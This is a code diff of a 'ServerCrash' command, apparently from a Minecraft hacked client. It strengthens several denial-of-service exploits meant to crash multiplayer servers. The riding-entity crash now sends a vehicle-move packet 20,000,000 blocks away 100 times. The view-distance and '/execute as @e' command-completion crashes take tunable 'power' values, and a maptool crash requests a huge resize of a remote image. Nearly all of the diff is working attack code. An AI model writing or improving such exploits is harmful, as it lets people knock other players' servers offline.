@@ -63,11 +63,14 @@ public class ServerCrash extends Command {
                 Entity ridingEntity = client.player.getVehicle();
                 if (ridingEntity == null) {
                     Notification.create(2000, "Server Crash", Notification.Type.ERROR, "You must ride a entity! (bruh)");
+                    return;
                 }
                 client.world.removeEntity(ridingEntity.getId(), RemovalReason.CHANGED_DIMENSION);
-                Vec3d forward = Vec3d.fromPolar(0, client.player.getYaw()).normalize().multiply(90000.0F);
-                ridingEntity.updatePosition(client.player.getX() + forward.x, client.player.getY(), client.player.getZ() + forward.z);
-                client.player.networkHandler.sendPacket(new VehicleMoveC2SPacket(ridingEntity));
+                Vec3d forward = Vec3d.fromPolar(0, client.player.getYaw()).normalize().multiply(20000000.0F);
+                for(int i = 0; i < 100; i++){
+                    ridingEntity.updatePosition(client.player.getX() + forward.x, client.player.getY(), client.player.getZ() + forward.z);
+                    client.player.networkHandler.sendPacket(new VehicleMoveC2SPacket(ridingEntity));
+                }
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Riding Crash Exploit");
             }
 
@@ -127,7 +130,7 @@ public class ServerCrash extends Command {
                     peenus = Integer.parseInt(args[1]);
                 } catch (NumberFormatException e) {
                     Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please Provide a power (around 500 is good)");
-                    break;
+                    return;
                 }
                 client.player.networkHandler.sendPacket(new ClientSettingsC2SPacket("en_us", peenus, ChatVisibility.FULL, true, 127, Arm.RIGHT, false, true));
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent View Distance Crash");
@@ -149,7 +152,7 @@ public class ServerCrash extends Command {
                     varvarvar2 = Integer.parseInt(args[1]);
                 } catch (NumberFormatException e) {
                     Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please Provide a power (around 1600 is good)");
-                    break;
+                    return;
                 }
                 String popper2 = "/execute as @e" + " as @e".repeat(varvarvar2);
                 client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, popper2));
@@ -169,6 +172,7 @@ public class ServerCrash extends Command {
                     var24 = Integer.parseInt(args[1]);
                 } catch (NumberFormatException e) {
                     Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please Provide a power (around 100 is good)");
+                    return;
                 }
                 client.player.sendChatMessage("/maptool new https://cdn.discordapp.com/attachments/956657243812675595/963652761172455454/unknown.png resize " + var24 + " " + var24 + "");
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Maptool Crash");
